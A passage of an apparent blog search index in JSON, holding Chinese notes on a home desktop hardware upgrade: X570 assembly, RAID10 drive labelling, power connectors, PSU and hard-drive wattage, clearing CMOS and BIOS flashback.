</ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u88c5\u673a\u7ecf\u9a8c","title":"\u88c5\u673a\u7ecf\u9a8c","text":"","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u51c6\u5907\u7684\u5de5\u5177","title":"\u51c6\u5907\u7684\u5de5\u5177","text":"<ul> <li>\u87ba\u4e1d\u5200</li> <li>\u7ec6\u94c1\u4e1d\uff0c\u624e\u5e26\u6216\u9b54\u672f\u8d34\uff0c\u7528\u4e8e\u7406\u7ebf</li> <li>m.2\u5bfc\u70ed\u8d34</li> <li>\u7845\u8102</li> <li>sata \u7ebf\uff08\u5982\u679c\u4e8c\u624b\u76d8\u6ca1\u6709\u7ebf\u7684\u8bdd\uff09</li> <li>\u4fbf\u5229\u8d34\uff08\u7ed9\u786c\u76d8\u505a\u6807\u8bb0\uff09</li> </ul> <p>\u5347\u7ea7\u65e7\u673a\u5668\u6e05\u7070</p> <ul> <li>\u5237\u5b50</li> <li>\u62b9\u5e03</li> <li>\u5439\u98ce\u673a\uff08\u5439\u5e72CPU\u6563\u70ed\u5668\uff09</li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u88c5\u673a\u7ecf\u9a8c_1","title":"\u88c5\u673a\u7ecf\u9a8c","text":"","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u6e05\u7070\u7ecf\u9a8c","title":"\u6e05\u7070\u7ecf\u9a8c","text":"<ul> <li>\u98ce\u6247\u76f4\u63a5\u6c34\u6d17\uff0c\u5237\u5b50\u5237\u592a\u6162\u4e86</li> <li>\u88c5\u673a\u65f6\u5148\u5c06CPU\u6563\u70ed\u5668\u62c6\u4e0b\u6765\u6c34\u6d17\uff0c\u5426\u5219\u667e\u5e72\u8981\u7b49\u633a\u4e45</li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u87ba\u4e1d\u7c7b\u578b","title":"\u87ba\u4e1d\u7c7b\u578b","text":"<ul> <li>\u673a\u7bb1\u87ba\u4e1d\uff1a\u56fa\u5b9a\u4e3b\u677f\uff0c\u7535\u6e90</li> <li>\u98ce\u6247\u87ba\u4e1d\uff1a\u81ea\u653b\u578b\uff0c\u6709\u5f88\u5927\u7684\u87ba\u7eb9</li> <li>\u673a\u68b0\u786c\u76d8\uff1a\u56fa\u5b9a\u673a\u68b0\u786c\u76d8\u5230\u786c\u76d8\u7b3c\u4e0a</li> <li>m.2\u87ba\u4e1d\uff1a\u53e6\u5916\u4e3b\u677f\u53ef\u80fdm.2\u662f2210\u7684\uff0c\u90a3\u4e48\u9700\u8981\u4e00\u4e2a6\u8fb9\u5f62\u7684\u87ba\u67f1\u3002</li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u4e3b\u677f\u6ce8\u610f","title":"\u4e3b\u677f\u6ce8\u610f","text":"<p>\u4e3b\u677f\u88c5\u5230\u673a\u7bb1\u4e0a\u6709\u4e00\u4e9b\u56fa\u5b9a\u5b54\u4f4d</p> <ul> <li>ATX, E-ATX \u4e3b\u677f\u6709 9 \u4e2a\u5b54\uff0c\u5bf9\u5e94\u673a\u7bb1\u87ba\u67f1\u3002\u5982\u679c\u6ca1\u627e\u52309\u4e2a\uff0c\u770b\u770b\u662f\u4e0d\u662f\u67d0\u4e9b\u6321\u677f\u6321\u4f4f\u4e86\uff0c\u6bd4\u5982ROG 570-E\u5c31\u9700\u8981\u628a\u4e24\u4e2am.2\u7684\u76d6\u677f\u53d6\u4e0b\u624d\u80fd\u770b\u5230\u3002</li> <li>m-ATX\u4e3b\u677f\u67098\u4e2a\u3002</li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u591a\u786c\u76d8\u6807\u53f7","title":"\u591a\u786c\u76d8\u6807\u53f7","text":"<p>p.s \u5b9e\u9645\u662f\u7ed9 sata \u7ebf\u6807\u53f7\u3002</p> <p>\u4e3b\u677fsata\u53e3\u7684\u987a\u5e8f\u51b3\u5b9a\u4e86\u673a\u5668\u5185\u8bc6\u522b\u7684sda,sdb\u7684\u7f16\u53f7\u3002\u63a5sata\u6570\u636e\u7ebf\u65f6\uff0c\u6709\u610f\u8bc6\u5730\u5c06\u987a\u5e8f\u5bf9\u5e94\u786c\u76d8\u7b3c\u7684\u987a\u5e8f\uff08\u6bd4\u5982\u4ece\u5e95\u5411\u4e0a\u4f9d\u6b21\u7f16\u53f71, 2, 3...\uff09\u3002\u8fd9\u6837\u574f\u6389\u4e00\u5757\u76d8\u65f6\u6839\u636esdx\u5c31\u53ef\u4ee5\u77e5\u9053\u662f\u7b2c\u51e0\u5757\u76d8\u574f\u4e86\u3002</p> <p>UPDATE \u611f\u89c9\u6ca1\u5fc5\u8981\u4e86</p> <ul> <li>\u53ef\u4ee5\u4f7f\u7528<code>/dev/disk/by-id</code>\u7684\u65b9\u5f0f\u8fdb\u884c\u6302\u8f7d\uff0c\u8fd9\u6837\u5b50\u53ef\u4ee5\u77e5\u9053\u574f\u6389\u76d8\u7684\u578b\u53f7\u548cSN\u7801\u3002\u6211\u7684\u534a\u5c9b\u94c1\u76d2\u662f\u80fd\u591f\u770b\u5230\u786c\u76d8\u4fa7\u9762\u7684\uff0c\u5e76\u4e14\uff0c\u786c\u76d8\u4fa7\u9762\u4e00\u822c\u90fd\u8d34\u4e86\u6807\u7b7e\uff0c\u5305\u542bSN\u53f7\u3002\u56e0\u6b64\u6211\u53ef\u4ee5\u7acb\u523b\u77e5\u9053\u662f\u54ea\u5757\u76d8\u3002</li> <li>\u5e76\u4e14\u5b9e\u9645\u64cd\u4f5c\u4e2d\uff0csata\u7ebf\u4e3b\u677f\u90a3\u7aef\u4e0d\u592a\u597d\u63d2\u3002\u4e00\u822c\u90fd\u662f\u5148\u63d2\u6ee1\u4e3b\u677f\uff0c\u518d\u7406\u7ebf\u548c\u63d2\u786c\u76d8\u3002\u6b64\u65f6\u5df2\u7ecf\u65e0\u6cd5\u533a\u5206sata\u7ebf\u7684\u987a\u5e8f\u4e86\uff08\u9664\u975e\u7ed9\u6bcf\u6761sata\u7ebf\u7f16\u53f7\uff09</li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#cpu\u548c\u663e\u5361\u4f9b\u7535\u6ce8\u610f","title":"CPU\u548c\u663e\u5361\u4f9b\u7535\u6ce8\u610f","text":"<ul> <li>\u4e3b\u677f24pin\u4f9b\u7535\uff0c\u7535\u6e90\u90a3\u5934\u53ef\u80fd\u662f\u62c6\u5f00\u7684\uff0c\u5982 18+10P \u8f6c24 pin</li> <li>\u5347\u7ea7x570\u540e\uff0cCPU\u4f9b\u7535\u4ece 8pin \u53d8\u4e3a 4+8pin\u3002\u6211\u7684\u7535\u6e90\u63d0\u4f9b\u4e86 2 \u6761 1 \u62d6 2 \u7684 P8 \u8f6c (4+4)P \u6a21\u7ec4\u7ebf \u3002\u7406\u8bba\u4e0a\u6211\u53ef\u4ee5\u53ea\u7528\u4e00\u6761\u6a21\u7ec4\u7ebf\uff0c\u5c06 1 \u62d6 2 \u7684\u4e24\u4e2a\u63a5\u53e3\u90fd\u63d2\u4e0a\u3002\u4f46\u662f\u67e5\u9605\u8d44\u6599\u53d1\u73b0\u8fd9\u6837\u505a\u4f3c\u4e4e\u6ca1\u6709\u610f\u4e49\u3002</li> </ul> <p>CPU\u76848+4Pin\u63a5\u53e3\u9700\u4e0d\u9700\u8981\u63d2\u6ee1\uff1f\u6ca1\u63d2\u6ee1\u4f1a\u600e\u4e48\u6837 \u2013 FCPOWERUP\u6781\u7535\u9b54\u65b9</p> <p>1\u62d62\u7684CPU\u6a21\u7ec4\u7ebf\u80fd\u4e0d\u80fd\u7528\uff1f  \u7b54\uff1a \u5c31\u662fP5\u3001P6\u8fd9\u79cd\u63a5\u6cd5\uff0c\u4e0a\u9762\u8bf4\u4e86\uff0c\u66f4\u591a\u7684\u7aef\u5b50\u662f\u4e3a\u4e86\u5206\u6d41\uff0c\u662f\u4e3a\u4e86\u540c\u65f6\u964d\u4f4e\u7535\u6e90\u6a21\u7ec4\u63a5\u53e3\u7aef\u548c\u4e3b\u677f\u7535\u6e90\u63a5\u53e3\u7684\u538b\u529b\u3002\u8fd9\u79cd\u8131\u88e4\u5b50\u653e\u5c41\u7684\u63a5\u6cd5\u53ea\u80fd\u6ee1\u8db3\u5f3a\u8feb\u75c7\u4e3a\u4e86\u63d2\u6ee1\u800c\u63d2\u6ee1\uff0c\u6ca1\u6709\u589e\u52a0\u5206\u6d41\u7684\u7aef\u5b50\u6570\u91cf\uff0c\u589e\u52a0\u63d2\u5934\u63d2\u5ea7\u5bf9\u4e8e\u964d\u4f4e\u7535\u6e90\u6a21\u7ec4\u63a5\u53e3\u7aef\u5b50\u7684\u538b\u529b\u5e76\u65e0\u610f\u4e49\u3002\u8981\u63a5\u5c31\u63a52\u6761\u6a21\u7ec4\u7ebf\u3002</p> <p>!!! note \u4e0d\u8fc75800x\u7684\u529f\u8017\u4e5f\u4e0d\u9700\u8981\u63d2\u6ee14 + 8pin\uff0c\u5355 8 pin \u5df2\u7ecf\u5f88\u591f\u7528\u4e86\u3002</p> <pre><code>\u4e00\u6761\u7ebf\u6750\u627f\u8f7d\u7535\u6d41\u6700\u5c0f\u4e5f\u6700\u5bb9\u6613\u53d1\u751f\u610f\u5916\u7684\u90e8\u5206\u662f\u91d1\u5c5e\u7aef\u5b50\u90e8\u5206\uff0c\u5b58\u5728\u4e8e\u6a21\u7ec4\u63a5\u53e3\u7684\u4e24\u7aef\u3002\u5982\u4e0b\u56fe\u91d1\u5c5e\u90e8\u5206\u5373\u4e3a\u6240\u8c13\u7684\u201c\u7aef\u5b50\u201d\u3002\u4e00\u4e2a\u5e38\u89c1\u7684Molex Mini-Fit Jr.5556 \u7aef\u5b50\u80fd\u627f\u8f7d\u7684\u7535\u6d41\u7ea6\u4e3a6~8A\u3002\n\n- CPU 4Pin \uff1a2\u7ec4\u6709\u6548\u56de\u8def\uff0c\u53ef\u627f\u8f7d16A / 192W  \n- CPU 8Pin \uff1a4\u7ec4\u6709\u6548\u56de\u8def\uff0c\u53ef\u627f\u8f7d28A / 336W  \n- CPU 8+4Pin \uff1a6\u7ec4\u6709\u6548\u56de\u8def\uff0c\u53ef\u627f\u8f7d36A / 432W  \n- CPU \u53cc8Pin \uff1a8\u7ec4\u6709\u6548\u56de\u8def\uff0c\u53ef\u627f\u8f7d48A / 576W\n</code></pre> <p>\u5173\u4e8e\u663e\u5361\u7684\u60c5\u51b5</p> <p>\u663e\u5361\u7684 6+2Pin \u63a5\u53e3\u5b9e\u9645\u4e0a\u91cc\u9762\u6709 3 \u4e2a Pin \u662f 12V\uff0c3 \u4e2a Pin \u662f GND\uff0c\u5269\u4f59 2 \u4e2a Pin \u662f\u68c0\u6d4b Sense\uff0c\u7528\u4e8e\u663e\u5361\u68c0\u6d4b\u63d2\u5934\uff0c\u5e76\u4e0d\u627f\u8f7d\u7535\u6d41\u3002\u6240\u4ee5 8Pin \u7684 PCIE \u6a21\u7ec4\u7ebf\u53ea\u6709 3 \u7ec4\u6709\u6548 12V\uff0c\u627f\u8f7d\u80fd\u529b 216W\u3002\u5e73\u5747\u6700\u5927\u529f\u8017\u5728 225W \u4ee5\u4e0a\u5373\u6709 8+6Pin \u548c\u53cc8Pin \u53ca\u4ee5\u4e0a\u7684\u663e\u5361\uff0c\u5fc5\u987b\u8981\u63a52\u6761\u53ca\u4ee5\u4e0a\u5355\u72ec\u7684\u6a21\u7ec4\u7ebf\u624d\u4e0d\u4f1a\u4f7f\u7aef\u5b50\u8fc7\u8f7d\u7194\u6bc1\u3002</p> <p></p> <p>\u6211\u7684\u5b89\u949b\u514b 650NE \u7535\u6e90\u7684\u8f93\u51fa\u63a5\u53e3</p> <p> </p> <p>IDE \u7535\u6e90\u63a5\u53e3\uff1a\u4e0b\u56fe\u662f\u786c\u76d8\u7684IDE\u63a5\u53e3\uff0c\u5de6\u8fb9\u662f\u7535\u6e90\u63a5\u53e3\uff0c\u901a\u8fc7\u7535\u6e90\u7ebf\u4e0e\u673a\u7bb1\u5185\u7684\u7535\u6e90\u7ebf\u76f8\u8fde\u3002\u53f3\u8fb9\u662f\u6570\u636e\u7ebf\uff0c\u901a\u8fc7\u6570\u636e\u7ebf\u4e0e\u8ba1\u7b97\u673a\u4e3b\u677f\u76f8\u8fde\u3002\u4e2d\u95f4\u662f\u8df3\u7ebf\uff0c\u5982\u679c\u60a8\u7684\u8ba1\u7b97\u673a\u4e2d\uff0c\u6709\u4e0d\u6b62\u4e00\u5757\u786c\u76d8\uff0c\u9700\u8981\u901a\u8fc7\u8df3\u7ebf\u6765\u8bbe\u7f6e\u4e3b/\u4ece\u76d8\u3002 </p> <p>SATA \u7535\u6e90\u7ebf\u5982\u679c\u4e0d\u591f\uff0c\u53ef\u4ee5</p> <ul> <li>\u8d2d\u4e70 SATA \u6bcd\u8f6c\u591a SATA \u7ebf\uff0c1 \u8f6c 3 \u4ef7\u683c 8.63</li> <li>\u8d2d\u4e70 IDE \u8f6c SATA\uff0c1 \u8f6c 4 \u4ef7\u683c 9.8</li> </ul> <p>SATA \u6570\u636e\u63a5\u53e3\u4e0d\u591f</p> <ul> <li>pcie 3.0x1 \u8f6c 4 \u4e2a SATA<ul> <li>\u514d\u9a71\uff08marvell 9215\uff09\uff1a99</li> <li>\u514d\u9a71\u4fbf\u5b9c\uff1a86</li> </ul> </li> <li>pcie 3.0x1 \u8f6c 2\u4e2a SATA<ul> <li>\u514d\u9a71\uff1a39</li> </ul> </li> </ul> <p>108 + 800 -&gt; 8T</p>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u7535\u6e90\u74e6\u6570\u9009\u62e9","title":"\u7535\u6e90\u74e6\u6570\u9009\u62e9","text":"<p>\u73b0\u5728\u7684\u7535\u8111\u5230\u5e95\u8981\u7528\u591a\u5927\u7535\u6e90\uff1f\u5c1d\u8bd5\u7528\u6700\u65b0\u8bbe\u5907\u6df1\u5165\u6d4b\u91cf\u4e00\u4e0b\u4e3b\u6d41\u7535\u8111\u5e73\u53f0\u7684\u529f\u8017\u60c5\u51b5\u3010\u7ffc\u738b\u3011_\u54d4\u54e9\u54d4\u54e9_bilibili</p> <p>\u53d1\u73b0\u673a\u68b0\u786c\u76d8\u542f\u52a8\u51e0\u79d2\u5185\u7684\u529f\u8017\u9ad8\u8fbe20-30w\uff0c\u90a3\u6211 8 \u5757\u786c\u76d8\u5c31\u9ad8\u8fbe 200w\u3002\u597d\u5728\u5f00\u673a\u65f6\uff0cCPU \u548c\u663e\u5361\u6ca1\u6709\u8d1f\u8f7d\uff0c\u56e0\u6b64\u603b\u529f\u8017\u662f\u591f\u7684\u3002 </p> <p>\u786c\u76d8\u529f\u8017\u8981\u591a\u5c11\u53ca\u914d\u5957\u7535\u6e90\u9009\u62e9\u4f9d\u636e_\u786c\u76d8_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com)</p> <p>\u673a\u68b0\u786c\u76d8\u529f\u7387\u5305\u542b12 v \u548c 5 v \u4f9b\u7535\u529f\u7387\u4e4b\u548c\u3002</p> <ul> <li>\u5e0c\u6377\u9177\u9c7cST8000DM004\uff0c5400 rpm\uff0c\u6807\u7b7e\u4e0a\u5199\u7740 +5V 0.55 A, + 12V 0.37 A\u3002\u56e0\u6b64\u603b\u529f\u7387 7.19 W\u3002</li> <li>\u6211\u7684\u5e0c\u6377\u9177\u9c7cST3000DM008\uff0c7200 rpm\uff0c\u5199\u7740+5V 0.75 A, + 12V 0.75 A\u3002\u603b\u529f\u7387 12.75 W\u30028 \u5757\u7c97\u7565\u4f30\u8ba1 102 W\u3002</li> </ul> <p>\u542f\u52a8\u65f6+12V\u6240\u9700\u7535\u6d41\u662f2A\uff0c\u90a3\u5c31\u662f24W\u7684\u529f\u8017\u3002\u4ee58\u76d8\u4f4dNAS\u63d2\u6ee1\u4e3a\u4f8b\uff0c\u5728\u673a\u5668\u542f\u52a8\u65f6\u5149\u786c\u76d8\u5c31\u9700\u898124W*8=192W\u7684\u529f\u7387\u3002 \u53ef\u89c1\u786c\u76d8\u5728\u4e0d\u540c\u5de5\u4f5c\u72b6\u6001\u5bf9\u7535\u6e90\u9700\u6c42\u662f\u4e0d\u540c\u7684\u3002\u542f\u52a8\u65f6\u53ea\u9700\u8981+12V\u7684\u4f9b\u7535\uff0c\u5176\u4ed6\u8bf8\u5982\u7a7a\u95f2\u3001\u8bfb\u5199\u3001\u5f85\u673a\u3001\u4f11\u7720\u65f6\u9664+12V\u4ee5\u5916\u8fd8\u9700+5V\u4f9b\u7535\uff0c\u4f46\u8fd9\u4e9b\u72b6\u6001\u6240\u9700\u7535\u6d41\u90fd\u8f83\u542f\u52a8\u7535\u6d41\u8981\u5c0f\u597d\u591a\u3002</p> <p>\u5982\u679c\u4f60\u8981\u7ec44U24\u76d8\u4f4d\u7684\u673a\u67b6\u670d\u52a1\u5668\u7684\u8bdd\uff0c\u5c31\u9700\u8981\u9009\u62e9+5V\u4f9b\u7535\u80fd\u529b\u8d85\u8fc71.4W*24=33.6W\u7684\u7535\u6e90\uff0c+12V\u4f9b\u7535\u80fd\u529b\u300b24W*24=576W\u7684\u7535\u6e90\u3002\u8fd9\u8fd8\u53ea\u662f\u786c\u76d8\u90e8\u5206\uff0c\u7b97\u4e0a\u5176\u4ed6\u677f\u5361\u3001CPU\u540e\u5bf9\u7535\u6e90\u4f9b\u7535\u80fd\u529b\u7684\u8981\u6c42\u5c31\u66f4\u9ad8\u4e86\u3002</p> <p>Antec NeoECO NE650C Power Supply Unit User Manual (manuals.plus) </p>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u786c\u76d8\u529f\u8017\u8868","title":"\u786c\u76d8\u529f\u8017\u8868","text":"<p>WD20EJRX: Western Digital WD Purple Series (China only) data sheet (tvtdigital.kz)</p> <ul> <li>4.4w, 4.1w, 0.4w</li> </ul> <p>st3000dm008/001</p> <ul> <li>Barracuda Data Sheet (seagate.com)</li> <li>Data Sheet (seagate.com)</li> <li>Operating Mode: 8.0w</li> <li>Idle Mode: 5.4w, </li> <li>Standby Mode, Sleep Mode: 0.75w</li> </ul> <p>ST4000VX000</p> <ul> <li>3.5 HARD DRIVE DATA SHEET (seagate.com)</li> <li>5.5w, 3.2w, 0.25w</li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u88c5\u673a\u987a\u5e8f","title":"\u88c5\u673a\u987a\u5e8f","text":"<ul> <li>\u88c5\u4e3b\u677f\uff1a<ul> <li>CPU<ul> <li>\u62c6CPU\u65f6\uff0cCPU\u662f\u4f1a\u81ea\u52a8\u5f39\u51fa\u6765\u7684\uff0c\u5426\u5219\u5c31\u662f\u62c9\u6746\u6ca1\u62e8\u5230\u4f4d\u3002</li> </ul> </li> <li>\u6563\u70ed\u5668<ul> <li>\u538b\u6563\u70ed\u5668\u65f6\u4e0d\u9700\u8981\u90a3\u4e48\u7cbe\u786e\u3002\u5de6\u53f3\u6643\u52a8\u4e0b\u8fd8\u80fd\u8d77\u5230\u62b9\u5300\u6548\u679c</li> <li>\u6709\u5f39\u7c27\u7684\u87ba\u4e1d\u662f\u53ef\u4ee5\u8f6c\u5230\u5e95\u7684</li> </ul> </li> <li>\u5185\u5b58\uff0cm.2\u56fa\u6001</li> </ul> </li> <li>\u88c5\u7535\u6e90\uff1a\u628a\u53ef\u80fd\u7528\u5f97\u5230\u7684\u7ebf\u5168\u90e8\u63a5\u4e0a\uff0c\u65b9\u4fbf\u4ee5\u540e\u63a5\u8bbe\u5907\uff0c\u7406\u4e00\u4e0b\u7ebf</li> <li>\u5c06\u4e3b\u677f\u56fa\u5b9a\u5230\u673a\u7bb1\u4e0a\u3002\u5982\u679cCPU\u4f9b\u7535\u7ebf\u4f4d\u7f6e\u5f88\u72ed\u7a84\uff0c\u5efa\u8bae\u5148\u63d2\u4e0a\u7ebf\u518d\u56fa\u5b9a\u5230\u673a\u7bb1\u4e0a\u3002\u7c7b\u4f3c\u7684\u8fd8\u6709\u98ce\u6247\u7ebf\u3002</li> <li>\u8fde\u63a5\u4e3b\u677fCPU\u4f9b\u7535\uff0c\u673a\u7bb1\u9762\u677f\u5404\u79cdI/O\u7ebf</li> <li>\u6839\u636e\u4e3b\u677f\u4e0a\u7684\u98ce\u6247\u4f4d\u7f6e\uff0c\u8003\u8651\u5982\u4f55\u8d70\u7ebf\u3002</li> <li>\u5b8c\u6bd5\uff0c\u88c5\u4e0a\u663e\u5361\u548c\u663e\u5361\u4f9b\u7535\uff0c\u5f00\u673a</li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u5e38\u89c1\u8c03\u8bd5\u64cd\u4f5c","title":"\u5e38\u89c1\u8c03\u8bd5\u64cd\u4f5c","text":"<ul> <li>\u534e\u7855\u666e\u901a\u4e3b\u677f\u4e0a\u6709Q-LED\uff0c\u9ad8\u7aef\u4e3b\u677f\u6709Q-Code</li> <li>\u5185\u5b58\u51fa\u95ee\u9898\u65f6\uff0c\u63d2\u4e0a\u5355\u6839\u8bd5\u8bd5\u3002\uff08\u63d2\u7684\u4f4d\u7f6e\u6709\u8bb2\u7a76\uff0c\u6700\u597d\u770b\u770b\u8bf4\u660e\u4e66\uff0c\u4e00\u822c\u662fA2\uff0c\u5373\u7b2c\u4e8c\u6216\u7b2c\u56db\u69fd\uff09</li> </ul>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u6e05cmos","title":"\u6e05CMOS","text":"<p>\u6e05CMOS\u7684\u51e0\u79cd\u65b9\u6cd5[\u4e3b\u677f]\u8bf7\u95eeClear CMOS\u6b65\u9aa4\u4e3a\u4f55? | \u5b98\u65b9\u652f\u6301 | ASUS \u4e2d\u56fd</p> <ul> <li>\u5173\u95ed\u8ba1\u7b97\u673a\u7535\u6e90\uff0c\u62d4\u6389\u7535\u6e90\u7ebf\u3002\u7528\u91d1\u5c5e\u77ed\u63a5CLR RTC\u4e24\u6839\u8df3\u7ebf\u63d2\u94885-10\u79d2<ul> <li>\u82e5\u4e0a\u8ff0\u7684\u6b65\u9aa4\u6ca1\u6709\u4f5c\u7528\uff0c\u8bf7\u5c06\u4e3b\u677f\u4e0a\u7684\u7535\u6c60\u79fb\u9664\uff0c\u5e76\u4e14\u518d\u6b21\u5c06\u8df3\u7ebf\u5e3d\u4f9d\u7167\u4e0a\u9762\u7684\u6b65\u9aa4\u6765\u6e05\u9664 CMOS RTC RAM \u7684\u6570\u636e\u3002\u5f53\u5b8c\u6210\u6e05\u9664\u7684\u52a8\u4f5c\u540e\uff0c\u8bf7\u518d\u5c06\u7535\u6c60\u88c5\u56de\u4e3b\u677f\u4e0a\u3002</li> </ul> </li> <li>\u6c34\u94f6\u7535\u6c60\u77ed\u8def\u6cd5\uff1aa.\u5148\u5c06\u8ba1\u7b97\u673a\u5173\u673a\uff0c\u518d\u5c06\u603b\u7535\u6e90\u5173\u6389\u6216\u5c06\u7535\u6e90\u7ebf\u62d4\u6389\u3002  b.\u6253\u5f00\u8ba1\u7b97\u673a\u673a\u58f3\u3002  c.\u5728\u4e3b\u677f\u4e0a\uff0c\u627e\u51fa\u7535\u6c60\u4f4d\u7f6e\u3002  d.\u5c06\u4e3b\u677f\u4e0a\u7684\u7535\u6c60\u62d4\u8d77\uff0c\u7136\u540e\u5c06\u7535\u6c60\u5ea7\u7684\u6b63/\u8d1f\u6781\u77ed\u8def\u7ea61\u5206\u949f\uff0c\u518d\u5c06\u7535\u6c60\u88c5\u56de\u3002</li> </ul> <p>Note</p> <p>CMOS \u8fd8\u6307\u4ee3\u4e86\u4e00\u79cd\u7279\u5b9a\u7684\u7535\u6c60\u4f9b\u7535\u7684\u534a\u5bfc\u4f53\u82af\u7247\uff0c\u7528\u4e8e\u5b58\u50a8\u8ba1\u7b97\u673a\u7684\u57fa\u672c\u8bbe\u7f6e\u548c\u914d\u7f6e\u4fe1\u606f\u3002\u8fd9\u4e2a\u82af\u7247\u901a\u5e38\u79f0\u4e3a CMOS \u5b58\u50a8\u5668\u6216 CMOS RAM\u3002CMOS \u5b58\u50a8\u5668\u901a\u5e38\u4f4d\u4e8e\u8ba1\u7b97\u673a\u4e3b\u677f\u4e0a\uff0c\u5b83\u5305\u542b\u4e00\u4e2a\u5c0f\u578b\u7684\u7535\u6c60\uff0c\u4ee5\u4fdd\u6301\u5b58\u50a8\u7684\u4fe1\u606f\u5728\u8ba1\u7b97\u673a\u5173\u95ed\u65f6\u4ecd\u7136\u6709\u6548\u3002 1. \u57fa\u672c\u8f93\u5165/\u8f93\u51fa\u7cfb\u7edf\uff08BIOS\uff09\u8bbe\u7f6e\uff1a\u4f8b\u5982\u542f\u52a8\u987a\u5e8f\u3001\u65e5\u671f\u548c\u65f6\u95f4\u3001CPU \u548c\u5185\u5b58\u914d\u7f6e\u7b49\u3002 2. \u5b9e\u65f6\u65f6\u949f\uff08RTC\uff09\u8bbe\u7f6e\uff1a\u7528\u4e8e\u8ddf\u8e2a\u65e5\u671f\u548c\u65f6\u95f4\u3002 3. \u5176\u4ed6\u7cfb\u7edf\u914d\u7f6e\uff1a\u53ef\u80fd\u5305\u62ec\u786c\u76d8\u9a71\u52a8\u5668\u548c\u5176\u4ed6\u8bbe\u5907\u7684\u914d\u7f6e\u4fe1\u606f\u3002</p>","tags":["raid10","x570","\u4e8c\u624b\u786c\u76d8","\u88c5\u673a"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2024/04/05/%E5%8F%B0%E5%BC%8F%E6%9C%BA%E5%8D%87%E7%BA%A7-%E7%A1%AC%E4%BB%B6%E7%AF%87/#\u5237bios","title":"\u5237BIOS","text":"<p>[\u4e3b\u677f] \u5982\u4f55\u4f7f\u7528USB BIOS FlashBack\u2122 \u529f\u80fd? | \u5b98\u65b9\u652f\u6301 | ASUS \u4e2d\u56fd</p> <p>\u534e\u7855\u4e3b\u677f\u7684FlashBack\u529f\u80fd\u53ef\u4ee5\u5728\u8fdb\u4e0d\u4e86BIOS\u7684\u60c5\u51b5\u4e0b\uff0c\u4ecd\u7136\u66f4\u65b0\u4e3b\u677fBIOS\u3002EZ 